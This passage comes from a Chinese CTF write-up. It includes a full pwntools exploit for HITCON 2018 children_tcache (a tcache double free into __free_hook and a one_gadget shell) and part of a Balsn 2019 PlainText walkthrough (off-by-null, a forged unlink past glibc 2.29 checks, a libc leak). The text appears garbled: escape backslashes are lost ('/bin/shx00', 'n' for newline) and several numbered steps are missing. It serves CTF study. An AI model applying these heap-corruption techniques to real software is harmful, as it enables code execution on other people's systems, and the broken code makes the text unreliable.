                             start_string='',end_string='n',
                             offset=0x00007f77c161e000-0x7f77c1a09ca0)
####  Double Free
接下来我们通过触发`Double Free`来完成利用，和原来的`Chunk
1`大小相同的`Chunk`，此时，下标`0`和`2`的`chunk`将指向同一块内存，而`Glibc 2.27`中没有对`Tcache`中`Double
Free`的检查，故我们可以很方便的完成利用链构造：
    creat(sh,0x78 ,'Chunk_1')
    delete(sh,0)
    delete(sh,2)
    creat(sh,0x78,p64(libc.symbols['__free_hook']))
    creat(sh,0x78,'Chunk_1')
    creat(sh,0x78,p64(libc.address + 0x4f322))
    delete(sh,3)
###  Final Exploit
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    HITCON_2018_children_tcache=ELF('./HITCON_2018_children_tcache', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./HITCON_2018_children_tcache")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./HITCON_2018_children_tcache")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def creat(sh,chunk_size,value):
        sh.recvuntil('Your choice: ')
        sh.sendline('1')
        sh.recvuntil('Size:')
        sh.sendline(str(chunk_size))
        sh.recvuntil('Data:')
        sh.sendline(value)
    def show(sh,index):
        sh.recvuntil('Your choice: ')
        sh.sendline('2')
        sh.recvuntil('Index:')
        sh.sendline(str(index))
    def delete(sh,index):
        sh.recvuntil('Your choice: ')
        sh.sendline('3')
        sh.recvuntil('Index:')
        sh.sendline(str(index))
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            creat(sh,0x480,'Chunk_0')
            creat(sh,0x78 ,'Chunk_1')
            creat(sh,0x4F0,'Chunk_2')
            creat(sh,0x20 ,'/bin/shx00')
            delete(sh,0)
            delete(sh,1)
            for i in range(9):
                creat(sh, 0x78 - i, 'A' * (0x78 - i))
                delete(sh,0)
            creat(sh,0x78,'B' * 0x70 + p64(0x480 + 0x10 + 0x70 + 0x10))
            delete(sh,2)
            creat(sh,0x480,'Chunk_0')
            show(sh,0)
            libc.address=get_address(sh=sh,info='LIBC ADDRESS --> ',start_string='',end_string='n',offset=0x00007f77c161e000-0x7f77c1a09ca0)
            creat(sh,0x78 ,'Chunk_1')
            delete(sh,0)
            delete(sh,2)
            creat(sh,0x78,p64(libc.symbols['__free_hook']))
            creat(sh,0x78,'Chunk_1')
            creat(sh,0x78,p64(libc.address + 0x4f322))
            delete(sh,3)
            flag=get_flag(sh)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x05 以 Balsn CTF 2019 pwn PlainText 为例
###  题目信息
保护全开，64位程序，Glibc-2.29
存在沙箱，可用的系统调用受到了限制。
###  漏洞分析
创建新`Chunk`时，存在`Off-by-null`。
###  漏洞利用
####  清理bin
我们在启动程序后查看程序的bin空间，发现里面十分的凌乱
    gef➤  heap bins
    ───────────────────── Tcachebins for arena 0x7f743c750c40 ─────────────────────
    Tcachebins[idx=0, size=0x20] count=7  ←  Chunk(addr=0x55dab47e4e60, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4700, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4720, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4740, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e43b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e43d0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e43f0, size=0x20, flags=PREV_INUSE) 
    Tcachebins[idx=2, size=0x40] count=7  ←  Chunk(addr=0x55dab47e5270, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4e80, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4ff0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4ec0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4af0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4c20, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4850, size=0x40, flags=PREV_INUSE) 
    Tcachebins[idx=5, size=0x70] count=7  ←  Chunk(addr=0x55dab47e59c0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5b40, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5cc0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5e40, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5fc0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e6140, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5730, size=0x70, flags=PREV_INUSE) 
    Tcachebins[idx=6, size=0x80] count=7  ←  Chunk(addr=0x55dab47e5920, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5aa0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5c20, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5da0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5f20, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e61b0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e56b0, size=0x80, flags=PREV_INUSE) 
    Tcachebins[idx=11, size=0xd0] count=5  ←  Chunk(addr=0x55dab47e5160, size=0xd0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4d90, size=0xd0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e49c0, size=0xd0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4630, size=0xd0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e42e0, size=0xd0, flags=PREV_INUSE) 
    Tcachebins[idx=13, size=0xf0] count=6  ←  Chunk(addr=0x55dab47e6030, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4f00, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4760, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4500, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4b30, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e52f0, size=0xf0, flags=PREV_INUSE) 
    ────────────────────── Fastbins for arena 0x7f743c750c40 ──────────────────────
    Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55dab47e4a90, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4ab0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5900, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e59a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5b20, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5ca0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5e20, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5fa0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e6120, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4ad0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e6230, size=0x20, flags=PREV_INUSE) 
    Fastbins[idx=1, size=0x30] 0x00
    Fastbins[idx=2, size=0x40]  ←  Chunk(addr=0x55dab47e53e0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5230, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e52b0, size=0x40, flags=PREV_INUSE) 
    Fastbins[idx=3, size=0x50] 0x00
    Fastbins[idx=4, size=0x60] 0x00
    Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x55dab47e6250, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5550, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5640, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5810, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5eb0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5d30, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5bb0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5a30, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e57a0, size=0x70, flags=PREV_INUSE) 
    Fastbins[idx=6, size=0x80]  ←  Chunk(addr=0x55dab47e55c0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5880, size=0x80, flags=PREV_INUSE) 
    ───────────────────── Unsorted Bin for arena 'main_arena' ─────────────────────
    [+] Found 0 chunks in unsorted bin.
    ────────────────────── Small Bins for arena 'main_arena' ──────────────────────
    [+] Found 0 chunks in 0 small non-empty bins.
    ────────────────────── Large Bins for arena 'main_arena' ──────────────────────
    [+] Found 0 chunks in 0 large non-empty bins.
那么，为了我们利用的方便，我们先对这些bin进行清理。
    # Clean Bins
    for i in range(7 + 11):
        creat(sh, 0x18 , 'Clean' + 'n')
    for i in range(7 + 3):
        creat(sh, 0x38 , 'Clean' + 'n')
    for i in range(7 + 9):
        creat(sh, 0x68 , 'Clean' + 'n')
    for i in range(7 + 2):
        creat(sh, 0x78 , 'Clean' + 'n')
    for i in range(5):
        creat(sh, 0xC8 , 'Clean' + 'n')
    for i in range(6):
        creat(sh, 0xE8 , 'Clean' + 'n')
####  构造堆布局，触发Unlink
  1. 首先申请`7`个`0x28`大小的`chunk`用于稍后填满`Tcache`。 
        for i in range(7):
        creat(sh, 0x28 , 'chunk_' + str(64+i) + 'n')
  2. 为了我们之后堆布局的方便，我们需要将接下来布局的`chunk`推到`0x?????????????000`的地址上，那么我们首先申请一个探测`Chunk`。 
        creat(sh, 0x18  , 'Test' + 'n')
那么我们需要在此处申请一个`0xBF8`的填充`Chunk`。
        creat(sh, 0xBF8  , 'pad' + 'n')
  3. 然后申请一个大小为`0x5E0`的`Chunk`和一个`0x18`大小的`Chunk`，这个`0x18`大小的`Chunk`是为了稍后释放`0x5E0`的`Chunk`时防止其被`Top Chunk`所吞并，释放大小为`0x5E0`的`Chunk`，现在，`Unsorted bin`中有一个`0x5F0`大小的`Chunk`，然后申请一个`0x618`大小的`Chunk`，`Unsorted bin`中的`0x5F0`大小的`Chunk`将会被加入`Large bin`。 
        creat(sh, 0x5E0 , 'chunk_72' + 'n') 
    creat(sh, 0x18  , 'chunk_73' + 'n')
    delete(sh,72)
    creat(sh, 0x618 , 'chunk_72' + 'n')
  4. 接下来，申请一个`0x28`大小的`Chunk 0`，内部布置成一个`fake chunk`，`fake chunk`位于`Chunk 0 + 0x10`
        creat(sh, 0x28  , 'a' * 8 + p64(0xe1) + p8(0x90))
⚠️：此时我们是从`Large_bin`中分割了`0x28`大小的内存，于是此`Chunk`中必定残留了我们所需要的`fd_nextsize`信息。分割剩余的`0x5C0`大小的`Chunk`将会被被加入`Unsorted
bin`中。
  5. 接下来我们再申请`4`个`0x28`大小的`Chunk`用于后续构造，这里将它们命名成`Chunk 1 ~ Chunk 4`。 
        creat(sh, 0x28  , 'chunk_75' + 'n')
    creat(sh, 0x28  , 'chunk_76' + 'n')
    creat(sh, 0x28  , 'chunk_77' + 'n')
    creat(sh, 0x28  , 'chunk_78' + 'n')
  6. 然后我们先将`0x28`大小的`Tcache`填满。 
        for i in range(7):
        delete(sh, 64 + i)
  7. 释放`Chunk 1`和`Chunk 3`，这两个`Chunk`将会被加入`Fastbin`，现在有：`Fastbin  bk = Chunk 0 + 0x10 = fake_chunk`。 
        creat(sh, 0x28  , 'b' * 8 + p8(0x10))
    creat(sh, 0x28  , 'chunk_1')
  11. 然后我们先将`0x28`大小的`Tcache`填满。 
        for i in range(7):
        delete(sh, 64 + i)
  12. 释放`Chunk 4`和`Chunk 0`，这两个`Chunk`将会被加入`Fastbin`，现在有：`Fastbin  fd = Chunk 0 + 0x10 = fake_chunk`，并通过`Chunk 4`伪造`Chunk 5`的`prev_size`域，进而触发`off-by-null`。 
        creat(sh, 0x28  , p8(0x10))
    creat(sh, 0x28  , 'c' * 0x20 + p64(0xe0))
  15. 从`Large bin`中取回其中大小为`0x500`的`chunk`
        creat(sh, 0x4F8  , 'n')
至此，我们的所有布置结束，我们来查看一下此时的堆布局：
  16. 现在我们释放`chunk 5`，触发向后合并。 
    1. 对于`2.29`新增的保护`__glibc_unlikely (chunksize(p) != prevsize)`，取出`Chunk 5`的`prev_size`为`0xE0`，然后`p = p - 0xE0`，恰好移动到了`fake_chunk`处，它的`size`恰好为`0xE0`，保护通过。
    2. 对于`2.27`新增的保护`chunksize (p) != prev_size (next_chunk (p))`，根据`0xE0`找到`next_chunk`为`Chunk 5`，验证`Chunk 5`的`prev_size`与`fake_chunk`的`size`相等，均为`0xE0`，保护通过。
    3. 对于`2.23`就已经存在的保护`__builtin_expect (fd->bk != p || bk->fd != p, 0)`，`fake_chunk -> fd`指向`Chunk 3`，之前已伪造`Chunk 3 -> bk = Chunk 0 + 0x10 = fake_chunk`，`fake_chunk -> bk`指向`Chunk 0`，之前已伪造`Chunk 0 -> fd = Chunk 0 + 0x10 = fake_chunk`，保护通过。
        delete(sh, 79)
至此，我们已经成功的构造了`Heap Overlap`。
但是正如我们所见，我们必须保证`heap`地址是`0x????????????0???`，那么，我们的成功率只有`1/16`。
####  泄露信息
接下来我们进行信息泄露，我们申请一个`0x18`大小的`Chunk`，将`libc`地址推到`chunk 1`的位置,直接查看`chunk
1`的内容即可获取`libc`基址。
    #Leak info
    creat(sh, 0x18 , 'n')
    show(sh,79)
    libc.address = get_address(sh=sh,info='LIBC_ADDRESS --> ',start_string='',end_string='n',offset=0x7f30e85f4000-0x7f30e87d8ca0)
然后我们继续泄露堆地址，首先申请一个`0x38`大小的`chunk`，现在我们拥有两个指向`chunk
1`位置的指针，首先选取之前为了清理`bin`而申请的一个`0x38`大小的`chunk`，释放，然后释放一次`chunk
1`，使用另一个指针直接查看`chunk 1`的内容即可获取`heap`基址。